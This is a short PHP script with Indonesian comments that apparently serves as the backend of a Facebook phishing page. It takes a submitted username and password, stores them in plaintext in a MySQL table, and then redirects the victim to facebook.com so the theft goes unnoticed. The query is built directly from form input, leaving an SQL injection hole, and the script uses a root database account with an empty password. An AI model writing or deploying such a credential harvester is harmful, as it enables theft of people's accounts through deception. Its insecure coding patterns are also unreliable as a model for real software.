<?php
// Konfigurasi koneksi database
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "abhil";

// Membuat koneksi
$conn = new mysqli($servername, $username, $password, $dbname);

// Memeriksa koneksi
if ($conn->connect_error) {
    die("Koneksi gagal: " . $conn->connect_error);
}

// Mendapatkan data dari form
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["pass"];

    // Melakukan query untuk menyisipkan data ke dalam tabel
    $sql = "INSERT INTO `abil` (`NAMA`, `SANDI`) VALUES ('$username', '$password')";
    
    if ($conn->query($sql) === TRUE) {
        // Data berhasil disisipkan
        header('Location:https://www.facebook.com/');
    } else {
        // Terjadi kesalahan saat menyisipkan data
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}

// Menutup koneksi
$conn->close();
?>
